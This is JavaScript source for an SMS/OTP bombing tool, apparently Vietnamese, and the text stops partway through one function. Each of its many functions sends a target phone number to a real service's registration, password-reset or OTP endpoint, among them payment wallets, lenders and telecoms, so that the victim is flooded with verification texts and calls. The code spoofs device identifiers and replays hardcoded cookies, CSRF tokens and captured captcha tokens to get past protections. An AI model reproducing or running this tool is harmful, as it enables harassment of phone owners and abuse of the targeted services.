const axios = require('axios');
const querystring = require('querystring');
function generateRandom(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function get_SECUREID(length = 17) {
    const characters = '0123456789abcdef';
    const charactersLength = characters.length;
    let randomString = '';
    for (let i = 0; i < length; i++) {
        randomString += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return randomString;
}

function get_microtime() {
    return Math.round(new Date().getTime());
}

function get_TOKEN() {
    function generateRandom(length) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const charactersLength = characters.length;
        let randomString = '';
        for (let i = 0; i < length; i++) {
            randomString += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return randomString;
    }

    return generateRandom(22) + ':' + generateRandom(9) + '-' + generateRandom(20) + '-' + generateRandom(12) + '-' + generateRandom(7) + '-' + generateRandom(7) + '-' + generateRandom(53) + '-' + generateRandom(9) + '_' + generateRandom(11) + '-' + generateRandom(4);
}

// IMEI
function generateImei() {
    const firstPart = Math.floor(100000 + Math.random() * 900000); // 6 chữ số ngẫu nhiên
    const secondPart = Math.floor(100000000 + Math.random() * 900000000); // 9 chữ số ngẫu nhiên
    return `${firstPart}${secondPart}`;
}


function getFunctionName(index) {
    const functions = [
        "VAYVND", "ROBOCASH", "LOSHIP", "F88", "TAMO", "META", "VIETTELL", "VETTELL2", "ZALOPAY", "VTPAY", "MOMO",
        "FPTSHOP", "TV360", "POPS", "THANTAIOI", "MCREDIT", "CAYDENTHAN",
        "DAIHOCFPT", "CAFELAND", "FINDO", "ONCREDIT", "AHAMOVE", "MONEYDONG", "FUNRING",
        "WINMART", "OLDFACEBOOK", "VAMO", "VIETID", "GOTADI", "CONCUNG", "UBOFOOD"
    ];
    return functions[index];
}



async function OLDFACEBOOK(phone) {
    try {
        const url = "https://www.instagram.com/accounts/account_recovery_send_ajax/";
        const data = querystring.stringify({
            email_or_username: phone,
            recaptcha_challenge_field: ''
        });
        const headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'x-csrftoken': 'EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD'
        };
        const response = await axios.post(url, data, { headers });
        console.log(response.data)
        // Check response status code
        if (response.status === 200) {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

async function WINMART(phone) {
    try {
        const data = { "firstName": "quoc", "phoneNumber": phone, "masanReferralCode": "", "dobDate": "2002-04-03", "gender": "Male" };
        const headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://winmart.vn',
            'Referer': 'https://winmart.vn/',
            'Authorization': 'Bearer undefined',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': "macOS",
            'Sec-Fetch-Dest':
                'empty',
            'Sec-Fetch-Mode':
                'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'X-Api-Merchant': 'WCM'
        };
        const url = `https://api-crownx.winmart.vn/iam/api/v1/user/register`;
        const response = await axios.post(url, data, { headers });
        console.log(response.data)
        if (response.status === 200) {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

async function MCREDIT(phone) {
    try {
        const headers = {
            'Host': 'mcredit.com.vn',
            'accept': '*/*',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://mcredit.com.vn',
            'referer': 'https://mcredit.com.vn/',
        };

        const data = JSON.stringify(phone);
        const response = await axios.post('https://mcredit.com.vn/api/Customers/requestOTP', data, { headers });
        console.log(response.data)
        if (response.data === '') {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

async function CAYDENTHAN(phone) { // call
    try {
        const headers = {
            'Host': 'api.caydenthan.vn',
            'accept-language': 'vi',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://caydenthan.vn',
            'referer': 'https://caydenthan.vn/',
        };

        const formattedPhone = phone.startsWith('84') ? phone : '84' + phone.replace(/^0+/, '');
        const data = {
            'full_name': 'Quoc',
            'first_name': 'pro',
            'last_name': 'LE',
            'mobile_phone': formattedPhone,
            'target_url': 'caydenthan.vn/'
        };

        const response = await axios.post('https://api.caydenthan.vn/api/user', data, { headers });
        console.log(response.data)
        if (response.data.token) {
            const tokenHeaders = { ...headers, 'authorization': `Bearer ${response.data.token}` };
            const getCodeResponse = await axios.get('https://api.caydenthan.vn/api/user/phone-confirmation-code', { headers: tokenHeaders });
            console.log(getCodeResponse)
        } else {
            const sendOTPData = JSON.stringify({ 'phone': formattedPhone });
            const sendOTPResponse = await axios.post('https://api.caydenthan.vn/api/user/send-one-time-password', sendOTPData, { headers });
            console.log(sendOTPResponse)
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

async function DAIHOCFPT(phone) {
    try {
        const headers = {
            'Host': 'daihoc.fpt.edu.vn',
            'accept': '*/*',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://daihoc.fpt.edu.vn',
            'referer': 'https://daihoc.fpt.edu.vn/tuyen-sinh-dh-fpt/'
        };

        const data = `firstname=Nguyên&mobilephone=${phone}&email=tenhkhong3%40gmail.com&city_id=B%C3%ACnh+Ph%C6%B0%E1%BB%9Bc&g-recaptcha-response: 03AFcWeA65TyGG2OjBdjivNhzW_Cbdw8iTRdKAuBWN7YEUAepxae717z9ZdFFo3ojDZQ3MZk20sX2qkm5iGcNm2VbRZuNW_jDUmj1OF4ATtrQzQGcHftR6DifnB5NRGOUP2saX2ZtA7kedPqfZvjyO627jyquT2ubCqQeg2snf2JhZ_V5-YyzHW8EtdWICSCDS7sCwm7hLUDyjgyFogsonbV4uYRWUJLVMlUgc-jsz3R3yFN_tBo7oM-JLCsAVgr5Qa_HhLINFTAk4FIOqCtjWMk93wqNAk81djRh_Q5rhAGQ8IgauvJYL1CP6cOMejikZhV3ZSx6YMawP8Wq7ZrDZFrQgLkhGbJZwOKXJAOGtwex9WUZIR5HxAVedsqSRGbQpsxikN7URAuIQbJvtD70NQJEJ7kJoKKu7akYqeeHUcqKjraqSJzZWqB73MBmPqnm15mKxbx8d2yaVdthBhSLRli5IinbMbWfakJprd1z0pe0_P-xA2vsUTkoNG-PQebVjEC_N6q5oLms9QURjZybHVb5W3WFuVg9vzzUuAg7bzWtNNfloOFR8VVH0aTFQaGG6rRyh2OScodslV7OFDKocG9BCQwHiUplBLQCQJ6uerhiU_542ob0RuXZuS9IGNsssOX9XdBfXfxEwBmu2zqpSm_oW6Jyro5dipwXa6ymT7i51X3SRW1JnbM-kEa1AVDAQWdGtl74COW8Z7E7z2hjp-6G11mhI1XHGt-asrpjW-Wgdqjp3ZNuR-AXPqqlJ0lNWLbeyGtyYpjxoZKACKpI0QDJLtBunZ82xkLIF-bicIsND-WqSv0oEKw0RLCjvA4PiYMbzQAebT-JmAyRCM1ekrtSnMOmRPCQL5xBpgeb5B-pwWO9aYkjJmR9xp1piqrhyfHykk8xa3j5eUdsaRnmi_4cCg4IEV4q2JlSzyUATeMAER4R4UmO47DyOCKxp5EY9KBsEFdc1sqihAynLpFAZ8Rn5ZqvS0rN643tCPoGT9UK_izKVODLWQ3n2dUFabqDmAabuxbOUbbVLNDbxc7VrFVaDD92usXyA8-mhbAsobYU6bkS9GT-zfCVX8qtgBy1Rw921HkYTc_z4XE79AwEQkReaMG_-VxfaRHgrF7w4X9nWy0s-0jXyvQ2Ir7igI98Xk2p3UyXsQksYOlNHifHO_1LUObAzUp8noRluikOcoFb9hm8wbU1YMVqaqjTX_HO28yb7vuDO55_6otineSyRmDzPdCmagImAdTsNE00P4reDn4FSb6tSFklPtJyC_BByM5l854ctFHn3PYtf6dSfT81_YLOd_YNJ8zZo80tSzEpwJdc9H_hYUllt9kJ74ge7IAc5dH5v29yg3aR-IxsVSTCho64-ii81Rbh5b7gNV3aCtZWnkeid2jwqblwoEZUcLjbfWwvTNwFFf__7L7DXoA3p6ZsaQJWhsSSdEG0t9b60Hb-nZEzUXLSxXLH0whm5xahBiG-U59wRjyVrNR1I8leuKyFtaSAQrOrDYzL-6O2VHO6g6DnpM80B-_sAd7aK-KLMg1b0Wj7Oh4ZRhw12S6ArmdJ-uPkLg-gVFaZFBouvih0ZZKAkRil9si8wN-fDNnnGwVHAYLt56EIK2-5cun2hheTU8MSHT3y3Nq2IMNiy-R0mzjXAQhV7QuW-RlTHXTifkWG3_vUE5Kq9kiCj2lmXXSN1Rr2A5q7iT0qYWeJ6lDUQz9dc_2TWbWBgZOYqj4iTSXDaodteEZTaxvLij6W9j1a0WQGvlQc7AmHej3FRSrt6NMhyMY69EP6YGgh_-s-6IEcoscaWQLjhLZH8nelnZhsWbmOyuR8NoVQRB9UcOcLhK17duhRnRlyZaKkK8JsZKIl-r04a0VO1_dtfDmsQYqA7cXb8x2WqUreRGI0UMkArEk4Vk0heJJGjsmTKyZJoX7SK66n7y0VsrM8Fe7yCChAdhkHBJ61U_jGhHj8YdNenNiwZCTUrjQoSP7Em2gL11ZmnBb8pLUdcitqFoGJsKxC9nbppyfsyzQxocca9cbZ3vRJCkBE&ldp_id=tuyen-sinh-dh-fpt&utm_source=&utm_medium=&utm_campaign=&utm_term=&url_referer=&utm_cpname=&utm_adscampaign=&script_uri=https%3A%2F%2Fdaihoc.fpt.edu.vn%2Ftuyen-sinh-dh-fpt%2F&type_register=`;
        const registerResponse = await axios.post('https://daihoc.fpt.edu.vn/tstt/tuyen-sinh-dh-fpt/register.php', data, { headers });
        console.log(registerResponse)
        const otpResponse = await axios.get(`https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?mobile=${phone}&resend_opt=1`, { headers });

        if (otpResponse.data.includes(phone)) {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

async function CAFELAND(phone) {
    try {
        const headers = {
            'Host': 'nhadat.cafeland.vn',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://nhadat.cafeland.vn',
            'referer': 'https://nhadat.cafeland.vn/dang-ky.html',
            'cookie': '_fbp=fb.1.1681635921620.1153873944;__zi=2000.SSZzejyD6zyjZ_AYrmnPo2t9yFR9GbVGRvNY_DTG5S9vX-sYtrDTZ7k4wA7VKrJ1UeBfxDjNLSLyXkJfCm.1;XSRF-TOKEN=eyJpdiI6ImlmZ2dwR3E3cmN6c0swa1lna0NOTXc9PSIsInZhbHVlIjoidG5NWWxOS1FxZTU0ZVFxekN4SmI1Z0VmVXQ5T2gwK1kxXC9HQTV6VFJDRVZ1U0haXC8yMldIYTdySERMS250aHdQIiwibWFjIjoiZGRlOTdhMjU5NGYyZGJkZDMzMmQxMTY2NDhkNDM2YjQ4M2JhMjI1YWRmYWYzZWViNDQ3ZmVlM2Y2NzNkMWM5MCJ9;laravel_session=eyJpdiI6IkJNSWdvektYKzJWMnZ1SGRzeTJpSVE9PSIsInZhbHVlIjoiYUY4dnlUbzI3bWhxK0Y5VkRIbXVwaWN3V3RLYmpZV04zemxib2krTEhRZTVPUlpraG40eE9Oa3Q5Q1wvMExrYmciLCJtYWMiOiJjNTNkMTNlMzIwZGIzNGZmNTY5MDQ5OGEzNTkzZGQ5MTlhMGE2NmVmMzM1ZTlkNzA3ZjRlMWFlNWQwNDg0Y2Y3In0%3D'
        };

        const registerPageResponse = await axios.get('https://nhadat.cafeland.vn/dang-ky.html', { headers });
        const token = registerPageResponse.data.match(/name="_token" value="([^"]+)"/)[1];
        const data = `mobile=${phone}&_token=${token}`;
        const sendOTPResponse = await axios.post('https://nhadat.cafeland.vn/member-send-otp/', data, { headers });
        console.log(sendOTPResponse.data)
        if (sendOTPResponse.data.active_check === '1' || sendOTPResponse.data.active_check === 'true') {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

async function FINDO(phone) {
    try {
        const headers = {
            'Host': 'api.findo.vn',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.findo.vn',
            'referer': 'https://www.findo.vn/'
        };

        const data = `{"mobilePhone":{"number":"${phone}"}}`;
        const response = await axios.post('https://api.findo.vn/web/public/client/phone/sms-code-ts', data, { headers });
        console.log(response.data)
        if (response.data.data[0] === '') {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}


// otp
async function VAYVND(phone) {
    try {
        const headers = {
            "Host": "api.vayvnd.vn",
            "accept": "application/json",
            "accept-language": "vi",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://vayvnd.vn",
            "referer": "https://vayvnd.vn/"
        };


        const resetData = { login: phone, trackingId: 'PiQN7hRQErCJEqbLWwiAklXu6L2e6MxUpVcb0PCGDzQC2zyZeynjZfwB3EIn2yMi' };
        const resetResponse = await axios.post('https://api.vayvnd.vn/v2/users/password-reset', resetData, { headers });

        if (resetResponse.data.result == 1 || resetResponse.data.result == "true") {
            return true;
        } else {
            return false;
        }

    } catch (error) {
        console.error(error);
        return false;
    }
}


async function LOSHIP(phone) {
    try {
        const headers = {
            "Host": "latte.lozi.vn",
            "accept-language": "vi_VN",
            "x-access-token": "unknown",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://loship.vn",
            "referer": "https://loship.vn/",
        };

        const data = JSON.stringify({
            device: "Android 12",
            platform: "Chrome WebView/96.0.4664.104",
            countryCode: "84",
            phoneNumber: phone
        });

        const response = await axios.post("https://latte.lozi.vn/v1.2/auth/register/phone/initial", data, { headers });
        const responseData = response.data;

        if (responseData.includes(phone)) {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

async function F88(phone) {
    try {
        const headers = {
            "Host": "api.f88.vn",
            "accept": "application/json, text/plain, */*",
            "content-encoding": "gzip",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://online.f88.vn",
            "referer": "https://online.f88.vn/",
        };

        const data = JSON.stringify({
            "phoneNumber": phone,
            "recaptchaResponse": "03AFcWeA5ovF_ngRC6j0w5kB3N_TvpYrrEpiit_d9nXqdFmqXOolAcJFwbeHTH0rrQ_VVGBbYXyInBKPGB7aZ7EYUKjqhsGUj-oHiiLNndqZ_21SOB_Z8k93rn4iAxWBtTBJ31fru-jFpkgFU-b0KazBXb5y5yX3plD_yibhXaD3tG0uTJjJlbnExp_sC7B8rDoqztCr1EQkSWMGln5jYNoxiCldB5Z4mk8H4xwOiutVUmvQEWtrOhWw02X69HpyFLRMVnjYhFaH_E8NOidb70obQ4wzTj2je6I5Sn_UC1mClmoBk3s0DKzWOQxOSdaVKVzy-wqj1mZo_76ne01HELKRgU8I12pC2h24ZobXBdMak5ZTtK4rDPuWnEyGL0QngwSUPE8hpxcG2KaD-wJ0-Ng4yJ8T-ZRzcvre9nJfokJQUlLjRM3Q12_HL8QbQiHLIOTWj1cgk_bC69OLIJivAnGlEjpcMWIhElpVLQX82OZN4DcRrX_oniw3YXx00lPKpO0an9JS52lUYEM_k2v84TPuGEyPB923AUtlPHGqt413KoQZc0uL94ycCaIdQa1b59qjmEQF4b5uOnWSERuqbRP37hpyxwb3XwmPcr_RLIw_caeT_VlOxPNa8r1n-7e1MXDOUwNxvFFe6fRX9ELB850RRGdwCBmF12V0pT39IlH5MxGVCP-Fckc_SgOy_gXP2sJNVu8oB9bxKkJWNjv3et9sArz3J9S-M2-g",
            "source": "Online"
        });

        const access = await axios.post("https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", data, { headers });
        console.log(access.data)
        if (access.data.message === "Gửi mã OTP thành công.") {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error.message);
        return false;
    }
}

async function TAMO(phone) {
    try {
        const headers = {
            "Host": "api.tamo.vn",
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.tamo.vn",
            "referer": "https://www.tamo.vn/",
        };

        const data = JSON.stringify({
            "mobilePhone": { "number": phone }
        });

        const access = await axios.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", data, { headers });

        if (!access.data.data[0]) {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

async function META(phone) {
    try {
        const headers = {
            "Host": "meta.vn",
            "Method": "POST",
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "content-type": "application/json",
            "origin": "https://meta.vn",
            "referer": "https://meta.vn/account/register",
            "cookie": "_ssid=lmhvoossowxf3vpyz4p4j2fj; _cart_=d7b5fce7-de11-4bf4-80b5-403962aa8c78; __ckmid=b72478dc2a454cf0b519850b0c728f5c; _gcl_au=1.1.1781069959.1712379047; _gid=GA1.2.2132287230.1712379048; .mlc=eyJjaXR5IjoiRGEgTmFuZyIsImNvdW50cnkiOiJWTiJ9; _ga=GA1.1.754153619.1712379048; _ga_YE9QV6GZ0S=GS1.1.1712380857.2.1.1712380879.0.0.0; _ga_L0FCVV58XQ=GS1.1.1712380854.2.1.1712380880.34.0.0"
        };

        const data = {
            "api_args": {
                "lgUser": phone,
                "type": "phone"
            },
            "api_method": "CheckRegister"
        };
        // console.log(data)
        const response = await axios.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1", data, { headers });
        // console.log(response)
        if (response.data.Status === "send_ok") {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

// Hàm VIETTELL
async function VIETTELL(phone) {
    try {
        const headers = {
            "Origin": "https://vietteltelecom.vn",
            "Host": "vietteltelecom.vn",
            "Connection": "keep-alive",
            "X-CSRF-TOKEN": "eO9pcXbEwbhRwdHJqmZRzyPB6TXNxv7NVv0UCaqC",
            "X-Xsrf-Token": "eyJpdiI6IlFYSUhUUUxyU0pieU5YYWRTU3l1Z0E9PSIsInZhbHVlIjoiSTFyN2Y4VWxiUVlRaG5rNExQZExtQUtERFEyZUh5aGdFZ2JBdmd4K2VCZGFYbjZRcVNoOE1hODJBMCtsZ2paayIsIm1hYyI6IjRmZWU1NjJkNTg1M2M4MzkzMDJhZDMxNzk4ZjAyMjAyMzA3OTc3NjY3NDY3ZDBjNDIzZDcwNzdmMjhmMDJlZmUifQ==",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Cookie": "laravel_session=G6a5z2SYTFAJaA3FT5bbbdZMnUQZ7J1n9mFPUbwf; _fbp=fb.1.1712381782122.1387139738; _ga=GA1.2.444907312.1712381782; _gid=GA1.2.1093712946.1712381784; _gat_UA-58224545-1=1; _gcl_au=1.1.50224899.1712381786; __zi=3000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NSqtr_JpqH9BtZY9_FgVNa_VF8txlvbTJv8qZlgvaLzEaJ0.1; _ga_VH8261689Q=GS1.1.1712381782.1.1.1712381813.29.0.0; XSRF-TOKEN=eyJpdiI6IlFYSUhUUUxyU0pieU5YYWRTU3l1Z0E9PSIsInZhbHVlIjoiSTFyN2Y4VWxiUVlRaG5rNExQZExtQUtERFEyZUh5aGdFZ2JBdmd4K2VCZGFYbjZRcVNoOE1hODJBMCtsZ2paayIsIm1hYyI6IjRmZWU1NjJkNTg1M2M4MzkzMDJhZDMxNzk4ZjAyMjAyMzA3OTc3NjY3NDY3ZDBjNDIzZDcwNzdmMjhmMDJlZmUifQ%3D%3D",
            "Referer": "https://vietteltelecom.vn/dang-nhap"
        };

        const data = { "phone": phone, "typeCode": "DI_DONG", "actionCode": "myviettel://login_mobile", "type": "otp_login" }

        const response = await axios.post("https://vietteltelecom.vn/api/getOTPLoginCommon", data, { headers });
        console.log(response.data)
        if (response.data.code === 200) {
            return true;
        } else {
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

// Hàm VETTELL2
async function VETTELL2(phone) {
    const headers = {
        "Host": "viettel.vn",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://viettel.vn"
    };

    // Lấy mã csrf-token từ trang đăng ký
    const csrfResponse = await axios.get("https://viettel.vn/dang-ky", { headers });
    const token = csrfResponse.data.match(/<meta name="csrf-token" content="(.+?)"/)[1];
    // Gửi yêu cầu OTP
    const otpData = { "msisdn": phone };
    const otpResponse = await axios.post("https://viettel.vn/api/get-otp", otpData, { headers });
    console.log(otpResponse.data)
    if (otpResponse.data.code === 200) {
        return true;
    } else {
        return false;
    }
}

// Hàm ZALOPAY
async function ZALOPAY(phone) {
    const headers = {
        "Host": "api.zalopay.vn",
        "x-platform": "NATIVE",
        "x-device-os": "ANDROID",
        "x-device-id": "690354367d96c358",
        "x-device-model": "Samsung SM-A217F",
        "x-app-version": "7.16.0",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 ZaloPay Android / 9881",
        "x-density": "xhdpi",
        "authorization": "Bearer",
        "x-drsite": "off",
        "accept-encoding": "gzip"
    };

    // Lấy token từ API để gửi OTP
    const statusResponse = await axios.get(`https://api.zalopay.vn/v2/account/phone/status?phone_number=${phone}`, { headers });
    console.log(statusResponse)
    if (statusResponse.data.error) {
        return false;
    }
    const token = statusResponse.data.data.send_otp_token;
    const otpData = { "phone_number": phone, "send_otp_token": token };
    const otpResponse = await axios.post("https://api.zalopay.vn/v2/account/otp", otpData, { headers });

    if (otpResponse.data.error === 1) {
        return false;
    } else {
        return true;
    }
}

// Hàm VTPAY
async function VTPAY(phone) {
    const headers = {
        "Host": "api8.viettelpay.vn",
        "product": "VIETTELPAY",
        "accept-language": "vi",
        "authority-party": "APP",
        "channel": "APP",
        "type-os": "android",
        "app-version": "5.1.4",
        "os-version": "10",
        "imei": "VTP_" + generateRandomString(32).toUpperCase(),
        "x-request-id": new Date().toISOString().replace(/[-:.]/g, ''),
        "content-type": "application/json; charset=UTF-8",
        "user-agent": "okhttp/4.2.2"
    };

    const data = { "type": "msisdn", "username": phone };
    const validateResponse = await axios.post("https://api8.viettelpay.vn/customer/v1/validate/account", data, { headers });
    console.log(validateResponse.data)
    if (validateResponse.data.status.code === "CS9901") {
        const registerData = {
            "hash": "",
            "identityType": "msisdn",
            "identityValue": phone,
            "imei": "VTP_" + generateRandomString(32).toUpperCase(),
            "notifyToken": "",
            "otp": "android",
            "pin": "VTP_" + generateRandomString(32).toUpperCase(),
            "transactionId": "",
            "type": "REGISTER",
            "typeOs": "android",
            "verifyMethod": "sms"
        };
        const registerResponse = await axios.post("https://api8.viettelpay.vn/customer/v2/accounts/register", registerData, { headers });
        return true;
    } else {
        const loginData = {
            "imei": "VTP_" + generateRandomString(32).toUpperCase(),
            "loginType": "BASIC",
            "msisdn": phone,
            "otp": "",
            "pin": "VTP_" + generateRandomString(32).toUpperCase(),
            "requestId": "",
            "typeOs": "android",
            "userType": "msisdn",
            "username": phone
        };
        const loginResponse = await axios.post("https://api8.viettelpay.vn/auth/v1/authn/login", loginData, { headers });
        return loginResponse.data.status.message === "Cần xác thực bổ sung OTP" || loginResponse.data.status.message === `Vui lòng nhập mã OTP được gửi về SĐT ${phone} để xác minh chính chủ`;
    }
}


// Hàm MOMO
async function MOMO(phone) {
    const imei = generateImei();
    const sec = get_SECUREID();
    const token = get_TOKEN();
    const rkey = generateRandom(20);
    const aaid = generateImei();
    const microtime = get_microtime();
    const headers = {
        "agent_id": "undefined",
        "sessionkey": "",
        "user_phone": "undefined",
        "authorization": "Bearer undefined",
        "msgtype": "CHECK_USER_BE_MSG",
        "Host": "api.momo.vn",
        "User-Agent": "okhttp/4.0.12",
        "app_version": "40122",
        "app_code": "4.0.12",
        "device_os": "ANDROID"
    };
    const data = {
        "user": phone,
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": microtime + "000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": "40122",
        "appCode": "4.0.12",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": true,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": phone,
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "Oppo realme X Lite",
            "firmware": "23",
            "hardware": "RMX1851CN",
            "manufacture": "Oppo",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": sec
        },
        "extra": {
            "checkSum": ""
        }
    };

    // Gửi yêu cầu CHECK_USER_BE_MSG
    let response = await axios.post("https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG", data, { headers });

    headers.msgtype = "SEND_OTP_MSG";
    data.msgType = "SEND_OTP_MSG";
    data.cmdId = microtime + "000000";
    data.momoMsg.device = "Galaxy A21s";
    data.momoMsg.hardware = "SM-A217F/DS";
    data.momoMsg.manufacture = "Samsung";
    data.extra.action = "SEND";
    data.extra.rkey = rkey;
    data.extra.AAID = aaid;
    data.extra.TOKEN = token;
    data.extra.SECUREID = sec;
    data.extra.MODELID = "Oppo RMX1851";
    data.extra.isVoice = false;
    data.extra.REQUIRE_HASH_STRING_OTP = true;

    // Gửi yêu cầu SEND_OTP_MSG
    response = await axios.post("https://api.momo.vn/backend/otp-app/public/", data, { headers });

    if (response.data.errorDesc === "Thành công") {
        return true;
    } else {
        return false;
    }
}

// Hàm FPTSHOP
async function FPTSHOP(phone) {
    const headers = {
        "Host": "fptshop.com.vn",
        "Origin": "https://fptshop.com.vn",
        "Referer": "https://fptshop.com.vn/",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
